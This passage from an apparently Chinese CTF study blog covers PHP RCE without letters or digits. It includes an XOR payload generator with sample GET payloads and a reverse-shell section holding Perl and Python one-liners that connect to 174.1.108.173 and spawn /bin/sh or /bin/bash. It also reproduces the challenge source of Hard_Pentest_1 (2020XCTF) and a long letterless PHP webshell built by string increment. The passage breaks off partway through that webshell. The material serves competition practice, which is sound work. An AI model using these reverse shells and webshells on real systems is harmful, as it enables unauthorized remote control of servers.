punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// dechex(255) = ff</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">==</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$l</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"%ff"</span><span class="token punctuation">;</span>            <span class="token variable">$r</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"%0"</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>            <span class="token variable">$l</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"%ff"</span><span class="token punctuation">;</span>            <span class="token variable">$r</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"%"</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token string">"\{$l^$r}"</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//payload1:</span><span class="token comment" spellcheck="true">// {%ff%ff%ff%ff^%a0%b8%ba%ab}    _GET</span><span class="token comment" spellcheck="true">// ?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=get_the_flag</span><span class="token comment" spellcheck="true">//payload2:</span><span class="token comment" spellcheck="true">//</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-反弹shell"><a href="#2-2-反弹shell" class="headerlink" title="2.2  反弹shell"></a>2.2  反弹shell</h2><p><strong>perl</strong></p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.1.108.173:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;-----------------------------------------------------------------------------------------perl -e &#39;use Socket;$i=&quot;127.0.0.1&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;这一条在[V&amp;N2020 公开赛]CHECKIN没有成功，但本机测试发现是可以的。</code></pre><p><strong>python</strong></p><pre><code>python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;174.1.108.173&#39;,10110));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><h1 id="3-真题"><a href="#3-真题" class="headerlink" title="3  真题"></a>3  真题</h1><h2 id="3-1-无数字字母rce"><a href="#3-1-无数字字母rce" class="headerlink" title="3.1  无数字字母rce"></a>3.1  无数字字母rce</h2><h3 id="3-1-1-Hard-Pentest-1（2020XCTF）"><a href="#3-1-1-Hard-Pentest-1（2020XCTF）" class="headerlink" title="3.1.1  Hard_Pentest_1（2020XCTF）"></a>3.1.1  Hard_Pentest_1（2020XCTF）</h3><p><strong>限制条件：</strong></p><p>过滤字符：数字   字母   ;   ~   ^   `   &amp;   |</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#index.php</span><span class="token comment" spellcheck="true">//Clear the uploads directory every hour</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"De1CTF2020"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"_"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"save in:"</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not Allow!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$BlackExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$exts</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9;~^`&amp;|]/is'</span><span class="token punctuation">,</span><span class="token variable">$file_content</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span>         <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$exts</span><span class="token punctuation">,</span> <span class="token variable">$BlackExts</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>         <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.\./'</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>upload<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路：</strong></p><p>需要构造无数字字母分号的webshell，而分号作为一种语句的结束和多个语句之间的分隔，在PHP的单行模式下则可以进行省略 。基于此构造一个无数字字母分号的<code>$_POST[__]($_POST[_])</code>进行RCE。同时需要注意后台为windows，后缀名用phtml的话就会有405错误，我们可以利用源码中对后缀名大小写不敏感的特性，用.pHP进行绕过。但是这种不能蚁剑连，又需要在此基础上写一个可以蚁剑连接的马，构造如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span 